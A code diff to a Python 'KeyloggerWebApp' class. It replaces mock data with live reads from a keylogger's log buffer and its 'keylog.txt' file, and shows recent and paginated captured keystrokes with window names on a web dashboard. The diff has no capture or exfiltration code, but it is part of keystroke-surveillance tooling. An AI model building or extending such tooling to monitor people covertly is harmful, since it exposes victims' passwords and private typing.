@@ -450,16 +450,50 @@ class KeyloggerWebApp:
     def _get_recent_activity(self) -> List[Dict[str, Any]]:
         """Get recent activity summary."""
         try:
-            # This would typically come from the logging manager
-            # For now, return mock data
-            return [
-                {
-                    'time': datetime.now().strftime('%H:%M:%S'),
-                    'type': 'Key Press',
-                    'content': 'Recent typing activity',
-                    'window': 'Browser'
-                }
-            ]
+            # Get recent activity from logging manager
+            if hasattr(self.keylogger, 'logging_manager'):
+                logging_manager = self.keylogger.logging_manager
+                
+                # Get recent entries from buffer (most recent)
+                with logging_manager.buffer_lock:
+                    recent_buffer_entries = list(logging_manager.log_buffer)[-10:]  # Last 10 entries
+                
+                # Convert LogEntry objects to dict format for template
+                recent_activity = []
+                for entry in recent_buffer_entries:
+                    recent_activity.append({
+                        'time': entry.timestamp.strftime('%H:%M:%S'),
+                        'type': entry.event_type,
+                        'content': entry.details[:50] + '...' if len(entry.details) > 50 else entry.details,
+                        'window': entry.window_name
+                    })
+                
+                # If buffer is empty, try to read from log file
+                if not recent_activity:
+                    try:
+                        log_file = self.config.get('logging.file_path', 'keylog.txt')
+                        if os.path.exists(log_file):
+                            # Read last few lines from log file
+                            with open(log_file, 'r', encoding='utf-8') as f:
+                                lines = f.readlines()[-10:]  # Last 10 lines
+                            
+                            for line in lines:
+                                parsed_entry = logging_manager._parse_log_line(line.strip())
+                                if parsed_entry:
+                                    recent_activity.append({
+                                        'time': parsed_entry.timestamp.strftime('%H:%M:%S'),
+                                        'type': parsed_entry.event_type,
+                                        'content': parsed_entry.details[:50] + '...' if len(parsed_entry.details) > 50 else parsed_entry.details,
+                                        'window': parsed_entry.window_name
+                                    })
+                    except Exception as file_error:
+                        logger.warning(f"Could not read log file: {file_error}")
+                
+                return recent_activity
+            
+            # Fallback: return empty list if no logging manager
+            logger.warning("No logging manager found in keylogger")
+            return []
             
         except Exception as e:
             logger.error(f"Error getting recent activity: {e}")
@@ -501,15 +535,80 @@ class KeyloggerWebApp:
     def _get_recent_logs(self, page: int, per_page: int, event_type: str = '', window_filter: str = '') -> Dict[str, Any]:
         """Get recent log entries with pagination."""
         try:
-            # This would typically come from the logging manager
-            # For now, return mock data structure
+            entries = []
+            
+            # Try to get logs from logging manager first
+            if hasattr(self.keylogger, 'logging_manager'):
+                logging_manager = self.keylogger.logging_manager
+                
+                # Get from buffer first
+                with logging_manager.buffer_lock:
+                    buffer_entries = list(logging_manager.log_buffer)
+                
+                # Convert buffer entries
+                for entry in buffer_entries:
+                    if event_type and entry.event_type.lower() != event_type.lower():
+                        continue
+                    if window_filter and window_filter.lower() not in entry.window_name.lower():
+                        continue
+                    
+                    entries.append({
+                        'timestamp': entry.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
+                        'event_type': entry.event_type,
+                        'details': entry.details,
+                        'window_name': entry.window_name
+                    })
+                
+                # If not enough entries, read from log file
+                if len(entries) < per_page:
+                    try:
+                        log_file = self.config.get('logging.file_path', 'keylog.txt')
+                        if os.path.exists(log_file):
+                            with open(log_file, 'r', encoding='utf-8') as f:
+                                lines = f.readlines()
+                            
+                            # Parse recent lines
+                            for line in reversed(lines[-100:]):  # Last 100 lines
+                                if len(entries) >= per_page:
+                                    break
+                                    
+                                parsed_entry = logging_manager._parse_log_line(line.strip())
+                                if parsed_entry:
+                                    if event_type and parsed_entry.event_type.lower() != event_type.lower():
+                                        continue
+                                    if window_filter and window_filter.lower() not in parsed_entry.window_name.lower():
+                                        continue
+                                    
+                                    # Check if already in entries (from buffer)
+                                    timestamp_str = parsed_entry.timestamp.strftime('%Y-%m-%d %H:%M:%S')
+                                    if not any(e['timestamp'] == timestamp_str and e['details'] == parsed_entry.details for e in entries):
+                                        entries.append({
+                                            'timestamp': timestamp_str,
+                                            'event_type': parsed_entry.event_type,
+                                            'details': parsed_entry.details,
+                                            'window_name': parsed_entry.window_name
+                                        })
+                    except Exception as file_error:
+                        logger.warning(f"Could not read log file: {file_error}")
+            
+            # Sort by timestamp (newest first)
+            entries.sort(key=lambda x: x['timestamp'], reverse=True)
+            
+            # Apply pagination
+            start_idx = (page - 1) * per_page
+            end_idx = start_idx + per_page
+            paginated_entries = entries[start_idx:end_idx]
+            
+            total_entries = len(entries)
+            total_pages = (total_entries + per_page - 1) // per_page
+            
             logs = {
-                'entries': [],
+                'entries': paginated_entries,
                 'pagination': {
                     'page': page,
                     'per_page': per_page,
-                    'total': 0,
-                    'pages': 0
+                    'total': total_entries,
+                    'pages': total_pages
                 },
                 'filters': {
                     'event_type': event_type,
